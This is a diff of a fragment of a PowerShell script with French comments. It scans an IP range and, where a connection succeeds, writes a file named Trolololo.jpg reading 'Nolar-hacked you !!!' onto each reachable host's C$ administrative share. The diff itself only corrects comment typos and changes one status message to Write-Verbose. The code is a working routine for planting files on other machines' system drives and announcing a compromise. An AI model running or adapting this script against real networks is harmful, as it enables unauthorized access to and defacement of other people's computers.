@@ -28,19 +28,19 @@ foreach ($r in $range){
    $socket = new-object System.Net.Sockets.TcpClient($ip, $port)
 
 #-------------------------------------------------------------------
-# On test essaye de se connecter en smb sur la machine puis on trasnfert
+# On essaye de se connecter en smb sur la machine puis on transfert
 #-------------------------------------------------------------------
 
         if($socket.Connected){
             $transfered = New-Item -Path "\\$ip\c$" -ItemType file -Name Trolololo.jpg -Value "Nolar-hacked you !!!"
 
 #-------------------------------------------------------------------
-# On vois si le transfert à été éffectué
+# On voit si le transfert à été éffectué
 #-------------------------------------------------------------------
 
                 if ($transfered.Exists){
                     ""
-                    "Port Open and File has been Transfered on $IP"
+                    Write-Verbose "Port Open and File has been Transfered on $IP"
                 }
                 Else {
                     ""
